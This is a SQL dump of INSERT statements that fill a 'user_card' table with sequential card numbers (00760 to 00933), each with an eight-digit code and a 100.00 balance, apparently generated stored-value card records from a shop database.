INSERT INTO `ec22703249_user_card` VALUES ('1760', '0', '1', '', '00760', '59913900', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1761', '0', '1', '', '00761', '31121132', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1762', '0', '1', '', '00762', '40049554', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1763', '0', '1', '', '00763', '58349107', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1764', '0', '1', '', '00764', '32455539', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1765', '0', '1', '', '00765', '98451872', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1766', '0', '1', '', '00766', '15791793', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1767', '0', '1', '', '00767', '49514551', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1768', '0', '1', '', '00768', '40097166', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1769', '0', '1', '', '00769', '26829512', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1770', '0', '1', '', '00770', '33049647', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1771', '0', '1', '', '00771', '50841932', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1772', '0', '1', '', '00772', '40416400', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1773', '0', '1', '', '00773', '77209147', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1774', '0', '1', '', '00774', '52788631', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1775', '0', '1', '', '00775', '34491288', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1776', '0', '1', '', '00776', '37276582', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1777', '0', '1', '', '00777', '23368406', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1778', '0', '1', '', '00778', '42762916', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1779', '0', '1', '', '00779', '25713209', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1780', '0', '1', '', '00780', '32528233', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1781', '0', '1', '', '00781', '26938949', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1782', '0', '1', '', '00782', '20739359', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1783', '0', '1', '', '00783', '59089862', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1784', '0', '1', '', '00784', '57686136', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1785', '0', '1', '', '00785', '13451061', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1786', '0', '1', '', '00786', '71218800', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1787', '0', '1', '', '00787', '57369249', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1788', '0', '1', '', '00788', '72260479', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1789', '0', '1', '', '00789', '36244545', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1790', '0', '1', '', '00790', '91292552', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1791', '0', '1', '', '00791', '44343273', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1792', '0', '1', '', '00792', '54648420', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1793', '0', '1', '', '00793', '85660310', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1794', '0', '1', '', '00794', '87342519', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1795', '0', '1', '', '00795', '11025073', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1796', '0', '1', '', '00796', '29212706', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1797', '0', '1', '', '00797', '80356481', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1798', '0', '1', '', '00798', '95070815', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1799', '0', '1', '', '00799', '33174262', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1800', '0', '1', '', '00800', '32241526', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1801', '0', '1', '', '00801', '80777524', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1802', '0', '1', '', '00802', '98560321', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1803', '0', '1', '', '00803', '44383359', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1804', '0', '1', '', '00804', '46381700', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1805', '0', '1', '', '00805', '48147898', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1806', '0', '1', '', '00806', '72798847', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1807', '0', '1', '', '00807', '40786560', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1808', '0', '1', '', '00808', '81288040', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1809', '0', '1', '', '00809', '91927309', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1810', '0', '1', '', '00810', '19388973', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1811', '0', '1', '', '00811', '72910454', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1812', '0', '1', '', '00812', '15377281', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1813', '0', '1', '', '00813', '65071249', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1814', '0', '1', '', '00814', '91266551', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1815', '0', '1', '', '00815', '57847729', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1816', '0', '1', '', '00816', '96703986', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1817', '0', '1', '', '00817', '66772214', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1818', '0', '1', '', '00818', '92868253', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1819', '0', '1', '', '00819', '66402494', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1820', '0', '1', '', '00820', '14252220', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1821', '0', '1', '', '00821', '10642337', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1822', '0', '1', '', '00822', '92665044', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1823', '0', '1', '', '00823', '49970229', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1824', '0', '1', '', '00824', '67339920', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1825', '0', '1', '', '00825', '88200014', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1826', '0', '1', '', '00826', '44959993', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1827', '0', '1', '', '00827', '44134576', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1828', '0', '1', '', '00828', '94932096', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1829', '0', '1', '', '00829', '47847029', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1830', '0', '1', '', '00830', '63549552', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1831', '0', '1', '', '00831', '87270154', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1832', '0', '1', '', '00832', '31340823', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1833', '0', '1', '', '00833', '62036672', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1834', '0', '1', '', '00834', '17684526', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1835', '0', '1', '', '00835', '90611958', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1836', '0', '1', '', '00836', '99229316', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1837', '0', '1', '', '00837', '12983359', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1838', '0', '1', '', '00838', '25502997', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1839', '0', '1', '', '00839', '93976006', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1840', '0', '1', '', '00840', '29632336', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1841', '0', '1', '', '00841', '98690587', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1842', '0', '1', '', '00842', '73466844', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1843', '0', '1', '', '00843', '33570619', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1844', '0', '1', '', '00844', '67894384', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1845', '0', '1', '', '00845', '29862395', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1846', '0', '1', '', '00846', '56563054', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1847', '0', '1', '', '00847', '21107826', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1848', '0', '1', '', '00848', '26985832', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1849', '0', '1', '', '00849', '55152957', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1850', '0', '1', '', '00850', '34718634', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1851', '0', '1', '', '00851', '82811146', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1852', '0', '1', '', '00852', '31559840', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1853', '0', '1', '', '00853', '44700867', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1854', '0', '1', '', '00854', '44288750', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1855', '0', '1', '', '00855', '40387556', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1856', '0', '1', '', '00856', '80946800', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1857', '0', '1', '', '00857', '90959676', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1858', '0', '1', '', '00858', '36088591', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1859', '0', '1', '', '00859', '20905834', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1860', '0', '1', '', '00860', '79703406', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1861', '0', '1', '', '00861', '60342511', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1862', '0', '1', '', '00862', '88189531', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1863', '0', '1', '', '00863', '19084258', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1864', '0', '1', '', '00864', '32831993', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1865', '0', '1', '', '00865', '46730511', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1866', '0', '1', '', '00866', '28905399', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1867', '0', '1', '', '00867', '96921362', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1868', '0', '1', '', '00868', '15151674', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1869', '0', '1', '', '00869', '97142455', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1870', '0', '1', '', '00870', '21320198', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1871', '0', '1', '', '00871', '67171866', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1872', '0', '1', '', '00872', '98061370', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1873', '0', '1', '', '00873', '21856485', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1874', '0', '1', '', '00874', '33542368', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1875', '0', '1', '', '00875', '37806973', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1876', '0', '1', '', '00876', '87346109', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1877', '0', '1', '', '00877', '61436150', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1878', '0', '1', '', '00878', '17229242', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1879', '0', '1', '', '00879', '81381130', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1880', '0', '1', '', '00880', '50982472', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1881', '0', '1', '', '00881', '56111539', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1882', '0', '1', '', '00882', '78820998', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1883', '0', '1', '', '00883', '84273714', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1884', '0', '1', '', '00884', '12236504', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1885', '0', '1', '', '00885', '88231140', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1886', '0', '1', '', '00886', '79398457', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1887', '0', '1', '', '00887', '51394826', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1888', '0', '1', '', '00888', '30344485', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1889', '0', '1', '', '00889', '62054650', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1890', '0', '1', '', '00890', '47143767', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1891', '0', '1', '', '00891', '91739744', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1892', '0', '1', '', '00892', '31481859', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1893', '0', '1', '', '00893', '75837187', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1894', '0', '1', '', '00894', '99507442', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1895', '0', '1', '', '00895', '30779102', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1896', '0', '1', '', '00896', '97887804', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1897', '0', '1', '', '00897', '91723351', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1898', '0', '1', '', '00898', '93721759', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1899', '0', '1', '', '00899', '35877603', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1900', '0', '1', '', '00900', '61343375', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1901', '0', '1', '', '00901', '30950791', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1902', '0', '1', '', '00902', '75659389', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1903', '0', '1', '', '00903', '27577850', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1904', '0', '1', '', '00904', '75741742', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1905', '0', '1', '', '00905', '47079027', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1906', '0', '1', '', '00906', '82617088', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1907', '0', '1', '', '00907', '70850198', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1908', '0', '1', '', '00908', '32795275', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1909', '0', '1', '', '00909', '30830045', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1910', '0', '1', '', '00910', '88740780', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1911', '0', '1', '', '00911', '68780075', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1912', '0', '1', '', '00912', '40202232', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1913', '0', '1', '', '00913', '25195743', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1914', '0', '1', '', '00914', '85071224', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1915', '0', '1', '', '00915', '35264658', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1916', '0', '1', '', '00916', '17267369', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1917', '0', '1', '', '00917', '16015906', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1918', '0', '1', '', '00918', '82155261', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1919', '0', '1', '', '00919', '89813561', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1920', '0', '1', '', '00920', '29452529', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1921', '0', '1', '', '00921', '82182416', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1922', '0', '1', '', '00922', '98038625', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1923', '0', '1', '', '00923', '60922862', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1924', '0', '1', '', '00924', '19776156', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1925', '0', '1', '', '00925', '18816575', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1926', '0', '1', '', '00926', '31301188', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1927', '0', '1', '', '00927', '68183597', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1928', '0', '1', '', '00928', '65491721', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1929', '0', '1', '', '00929', '47949020', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1930', '0', '1', '', '00930', '96888040', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1931', '0', '1', '', '00931', '12789326', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1932', '0', '1', '', '00932', '41206504', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1933', '0', '1', '', '00933', '57230980', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
